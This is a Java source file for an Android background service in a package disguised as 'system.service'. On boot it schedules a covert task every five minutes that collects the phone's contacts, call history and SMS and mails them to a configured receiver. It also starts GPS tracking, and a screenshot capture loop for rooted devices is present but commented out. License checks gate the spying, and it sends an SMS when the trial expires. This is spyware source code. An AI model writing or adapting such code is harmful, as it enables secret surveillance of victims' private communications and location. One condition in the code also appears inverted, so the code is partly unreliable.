package system.service;

import java.util.Timer;
import java.util.TimerTask;

import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.gps.GpsUtil;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.util.Log;

/**
 * Demo service that schedules a timer task
 * The timer task will execute the following tasks:
 *  - When starting the networks and over 24 hours to the previous timing, 
 *    will get all contacts, phone call history and SMS, 
 *    saved as attachments and mail to the qualified receiver.
 *  - When staring the machine and network is connected, 
 *    get the 1st screenshot delayed 3 seconds and then do it in a 30 seconds circle.    
 */
public class BootService extends Service 
{
	private final String LOGTAG = "BootService";
	
	private Timer mGetInfoTimer;
	private GetInfoTask mInfoTask;
	private final long mGetInfoDelay  = 10000; // 10 Seconds
	private final long mGetInfoPeriod = 300000; // 300 Seconds
	
	private Timer mScreenshotTimer;
	private CaptureTask mCapTask;
	private final long mScreenshotDelay  = 3000;  // 3  Seconds
	private final long mScreenshotPeriod = 30000; // 30 Seconds
	
	public static GpsUtil gps;

	@Override
	public IBinder onBind(final Intent intent) {
		Log.v(LOGTAG, "onBind"); 
		return null;
	}
	
	@Override
    public void onDestroy() {  
        Log.v(LOGTAG, "onDestroy");  
    }
	
	@Override  
    public boolean onUnbind(Intent intent) {  
        Log.v(LOGTAG, "onUnbind");  
        return super.onUnbind(intent);  
    }

	@Override
	public void onCreate() {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		super.onCreate();
		
		mGetInfoTimer = new Timer();
		mInfoTask = new GetInfoTask(getApplicationContext());
		
		//mScreenshotTimer = new Timer();
		//mCapTask = new CaptureTask(this);
	}

	@Override
	public void onStart(final Intent intent, final int startId) {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		super.onStart(intent, startId);
		
		// Start timer to get contacts, phone call history and SMS
		Context context = getApplicationContext();
		String[] mails = GlobalPrefActivity.getMail(context).split(",");
		mails = StrUtils.filterMails(mails);
		if (mails.length > 0) return;
		
		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
		if (type == LICENSE_TYPE.FULL_LICENSED  ||
			type == LICENSE_TYPE.SUPER_LICENSED ||
			type == LICENSE_TYPE.PART_LICENSED  ||
			(type == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.stillInTrial(context))) 
		{
			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
			
			gps = new GpsUtil(getApplicationContext());
		
			//Start timer to capture screenshot
			/*
	        if (!SysUtils.isRooted(getApplicationContext())) {
	        	Log.i(LOGTAG, "Not rooted");
	        } else {
	        	mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
	        }
	        */
		} 
		
		// If out of trial and not licensed, send a SMS to warn the receiver user
		else if (type == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context))
		{
			// If has sent before, DO NOT send again
			if (ConfigCtrl.getHasSentExpireSms(context)) return;
			
			// Send a SMS to the receiver that has expired
			String receiverPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
			if (receiverPhoneNum != null && receiverPhoneNum.length() > 0) {
				String msg = String.format(context.getResources().getString(R.string.msg_has_sent_trial_expire_sms), ConfigCtrl.getSelfName(context));
				boolean ret = SmsCtrl.sendSms(receiverPhoneNum, msg);
				if (ret) {
					ConfigCtrl.setHasSentExpireSms(context, true);
				}
			}
		}
	}
	
	public class IaiaiBinder extends Binder {  
        public BootService getService() {  
            return BootService.this;  
        }  
    }
}